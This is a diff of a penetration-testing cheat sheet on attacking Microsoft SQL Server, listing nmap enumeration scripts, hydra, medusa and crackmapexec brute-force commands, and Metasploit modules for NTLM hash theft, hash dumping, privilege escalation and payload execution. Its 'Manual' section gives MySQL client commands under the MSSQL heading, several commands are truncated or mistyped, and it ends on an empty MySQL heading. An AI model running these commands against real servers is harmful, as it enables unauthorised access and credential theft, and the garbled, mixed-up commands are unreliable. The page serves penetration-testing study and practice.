@@ -1,45 +1,84 @@
 # MSSQL
 
+## :information\_source: Introduction
+
+[Microsoft SQL](https://medium.com/@toprak.mhmt/what-is-mssql-9a152d7d4ed0)
+
+By default, the typical ports used by SQL Server and associated database engine services are: **TCP 1433, 4022, 135, 1434, UDP 1434.**
+
+## :ballot\_box\_with\_check: Checklist
+
+* [ ] Try to query the DB if you have creds
+* [ ] heck for DAC (Dedicated Access Connection)
+* [ ] Login brute force
+*
+
 ## Enumeration
 
 ```
-nmap -n -sV --version-intensity=5 -sT -Pn -p T:1433 --script=xxxx <IP>
+nmap -sV -p 1433,1433  <IP>
+nmap --script ms-sql-info <IP>
 auxiliary/scanner/mssql/mssql_ping
+nmap --script ms-sql-info,ms-sql-empty-password,ms-sql-xp-cmdshell,ms-sql-config,ms-sql-ntlm-info,ms-sql-tables,ms-sql-hasdbaccess,ms-sql-dac,ms-sql-dump-hashes --script-args mssql.instance-port=1433,mssql.username=sa,mssql.password=,mssql.instance-name=MSSQLSERVER -sV -p 1433 <I
+```
+
+## Authenticate with Empty Password
+
+```
+# Attempts to authenticate to Microsoft SQL Servers using an empty password forthe sysadmin (sa) account.
+ms-sql-empty-password
 ```
 
 ## Login Brute Force
 
 ```
-nmap --script ms-sql-brute [target ip]
+nmap -p 1433 –script ms-sql-brute –script-args userdb=[user.txt] ,passdb=[pass.txt] [target
+use auxiliary/scanner/mssql/mssql_login
+hydra -L [user.txt] –P [pass.txt] [target] mssql
+medusa -h [target] –U [user.txt] –P [pass.txt] –M mssql
+crackmapexec mssql <IP> -d <Domain Name> -u usernames.txt -p passwords.txt
 ```
 
-## Query (with credentials)
+## Dedicated Admin Connection (DAC)
+
+The DAC port is used to connect to the database instance when normal connection attempts fail, for example, when server is hanging, out of memory or in other bad states. In addition, the DAC port provides an admin with access to system objects otherwise not accessible over normal connections.
+
+The DAC feature is accessible on the loopback adapter per default, but can be activated for remote access by setting the 'remote admin connection' configuration value to 1. In some cases, when DAC has been remotely enabled but later disabled, the sql browser service may incorrectly report it as available.
 
 ```
-ms-sql-config
+sudo nmap -sU -p 1434 --script ms-sql-dac <ip>
 ```
 
-```bash
-# Queries Microsoft SQL Server (ms-sql) instances for a list of databases, linked servers,and configuration settings.
-# Credentials required
-ms-sql-config
+## Query the DB (with credentials)
 
-# Queries the Microsoft SQL Browser service for the DAC (Dedicated AdminConnection)
-ms-sql-dac
+### Automated
 
+Queries Microsoft SQL Server (ms-sql) instances for a list of databases, linked servers, and configuration settings.
+
+{% hint style="warning" %}
+Credentials are required
+{% endhint %}
+
+```
+nmap --script ms-sql-config
+# example:
+nmap -p 1433 --script ms-sql-config --script-args mssql.username=sa,mssql.password=sa <host>
+```
+
+sample output:
+
+![](<../../.gitbook/assets/image (274).png>)
+
+#### Other nmap Scripts with Credentials
+
+```
 # Dumps the password hashes from an MS-SQL server in a format suitable
 # Credentials required
 ms-sql-dump-hashes
 
-# Attempts to authenticate to Microsoft SQL Servers using an empty password forthe sysadmin (sa) account.
-ms-sql-empty-password
-
 # Queries Microsoft SQL Server (ms-sql) instances for a list of databases a user hasaccess to.
 # Credentials required
 ms-sql-hasdbaccess
-
-# Attempts to determine configuration and version information for Microsoft SQLServer instances
-ms-sql-info
 
 # Runs a query against Microsoft SQL Server (ms-sql).
 # Credentials required.
@@ -53,3 +92,77 @@ ms-sql-tables
 # Credentials required
 ms-sql-xp-cmdshell
 ```
+
+#### Metasploit Modules:
+
+```
+#Set USERNAME, RHOSTS and PASSWORD
+#Set DOMAIN and USE_WINDOWS_AUTHENT if domain is used
+​
+#Steal NTLM
+msf> use auxiliary/admin/mssql/mssql_ntlm_stealer #Steal NTLM hash, before executing run Responder
+​
+#Info gathering
+msf> use admin/mssql/mssql_enum #Security checks
+msf> use admin/mssql/mssql_enum_domain_accounts
+msf> use admin/mssql/mssql_enum_sql_logins
+msf> use auxiliary/admin/mssql/mssql_findandsampledata
+msf> use auxiliary/scanner/mssql/mssql_hashdump
+msf> use auxiliary/scanner/mssql/mssql_schemadump
+​
+#Search for insteresting data
+msf> use auxiliary/admin/mssql/mssql_findandsampledata
+msf> use auxiliary/admin/mssql/mssql_idf
+​
+#Privesc
+msf> use exploit/windows/mssql/mssql_linkcrawler
+msf> use admin/mssql/mssql_escalate_execute_as #If the user has IMPERSONATION privilege, this will try to escalate
+msf> use admin/mssql/mssql_escalate_dbowner #Escalate from db_owner to sysadmin
+​
+#Code execution
+msf> use admin/mssql/mssql_exec #Execute commands
+msf> use exploit/windows/mssql/mssql_payload #Uploads and execute a payload
+​
+#Add new admin user from meterpreter session
+msf> use windows/manage/mssql_local_auth_bypass
+```
+
+### Manual
+
+#### Local:
+
+```
+mysql -u root # Connect to root without password
+mysql -u root -p # A password will be asked (check someone)
+mysql -u root -h 127.0.0.1 -e 'show databases;'
+```
+
+Remote:
+
+```
+mysql -h <Hostname> -u root
+mysql -h <Hostname> -u user@target-host
+```
+
+
+
+![](<../../.gitbook/assets/image (276).png>)
+
+## MySQL arbitrary read file by client
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
